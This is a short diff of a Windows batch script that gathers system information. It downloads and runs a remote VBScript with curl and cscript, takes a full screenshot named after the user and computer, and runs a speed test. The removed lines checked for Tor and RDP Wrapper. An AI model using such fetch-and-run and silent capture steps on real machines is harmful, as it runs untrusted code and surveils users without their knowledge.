@@ -28,20 +28,6 @@ curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osi
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
-echo >> "%username%@%computername%.txt"
-echo      Installed Services: >> "%username%@%computername%.txt"
-echo      =================== >> "%username%@%computername%.txt"
-IF EXIST "C:\Tor\tor.exe" (
-  echo    Tor found! >> "%username%@%computername%.txt"
-) ELSE (
-  echo.
-)
-IF EXIST "C:\Program Files\RDP Wrapper\rdpwrap.ini" (
-  echo    RDP Wrapper found! >> "%username%@%computername%.txt"
-) ELSE (
-  echo.
-)
-echo >> "%username%@%computername%.txt"
 "%appdata%\Ookla\Speedtest CLI\speedtest.exe" >> "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
 
